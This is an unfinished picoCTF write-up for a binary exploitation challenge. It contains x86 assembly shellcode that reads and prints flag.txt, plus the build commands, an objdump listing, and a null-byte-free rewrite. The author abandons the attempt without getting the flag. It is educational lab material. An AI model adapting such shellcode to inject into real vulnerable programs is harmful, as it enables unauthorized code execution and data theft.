# shellcode
__Category:__ Binary Exploitation   
__Points:__ 200

### Problem:

This [program](vuln) executes any input you give it. Can you get a shell? You can find the program in /problems/shellcode_2_0caa0f1860741079dd0a66ccf032c5f4 on the shell server. [Source](vuln.c).

##### Hints:
> Maybe try writing some shellcode?

> You also might be able to find some good shellcode online.

### Solution:

I started by looking at the source. The program accepts up to 148 characters as input and executes the input.
I then opened the problem directory and found a flag.txt file. I assumed printing this would give the flag. Time to write some shellcode.

```Assembly``
section .data
   bufsize dw   1024
   filename db  'flag.txt'

section .bss
   buf resb     1024
   
section .text
  global _start
 
_start:
  ; open the file
  mov ebx, filename
  mov eax, 5 ; Syscall number for open()
  int 80h    ; syscall for the function stored in eax
  
  ; Read the file
  mov ebx, eax ; Get file descriptor
  mov eax, 3   ; Syscall number for read()
  mov ecx, buf
  mov edx, bufsize
  int 80h
  
  ; Write to stdout
  mov eax, 4 ; Syscall number for write 
  mov ebx, 1 ; stdout
  mov ecx, buf
  int 80h
  ```
  
  This assembly code opens the flag.txt file, reads it into a buffer, then writes the buffer to stdout. I saved it in a file called shell.asm then used nasm to compile and ld to link the program.
  
  ```Bash
  $nasm -f elf -o shell.o shell.asm
  $ld -o shell shell.o -m elf_i386
  ```
  
  I created a flag.txt file on my computer and tested the program out. It works, so the next step was to turn it into shellcode.I used objdump to get the raw byte code
  
  ```Bash
  $objdump -M intel -d shell

shell:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:	bb 02 a0 04 08       	mov    ebx,0x804a002
 8049005:	b8 05 00 00 00       	mov    eax,0x5
 804900a:	cd 80                	int    0x80
 804900c:	89 c3                	mov    ebx,eax
 804900e:	b8 03 00 00 00       	mov    eax,0x3
 8049013:	b9 0c a0 04 08       	mov    ecx,0x804a00c
 8049018:	ba 00 a0 04 08       	mov    edx,0x804a000
 804901d:	cd 80                	int    0x80
 804901f:	b8 04 00 00 00       	mov    eax,0x4
 8049024:	bb 01 00 00 00       	mov    ebx,0x1
 8049029:	b9 0c a0 04 08       	mov    ecx,0x804a00c
 804902e:	cd 80                	int    0x80
  ```
  
 Since we are injecting the program as a string we cannot have any null bytes (represented by 00) since this will terminate the string. I rewrote the program using some tricks to remove any null bytes. Also since we are only injecting the start function, I pushed "flag.txt" onto the stack.
 
 ```Assembly
 section .data
   bufsize dw   1024

section .bss
   buf resb     1024
   
section .text
  global _start
 
_start:
  xor eax, eax    ; clear eax
  ; push "flag.txt" onto the stack (in reverse order)
  push edx
  push 0x7478742e ; txt.
  push 0x67616c66 ; galf
  
  ; open the file
  mov ebx, esp ; filename
  xor eax, eax
  mov al,  5   ; Syscall number for open()
  int 80h      ; syscall for the function stored in eax
  
  ; Read the file
  mov ebx, eax ; Get file descriptor
  xor eax, eax
  mov al, 3    ; Syscall number for read()
  mov ecx, buf
  mov edx, bufsize
  int 80h
  
  ; Write to stdout
  xor eax, eax
  xor ebx, ebx
  mov al, 4 ; Syscall number for write 
  mov bl, 1 ; stdout
  mov ecx, buf
  int 80h
 ```
 
 I just realized this is going to be way too long to input into our program. I'll get back to this problem soon. I'll probably try executing /bin/sh
  
### Flag:

picoCTF{}
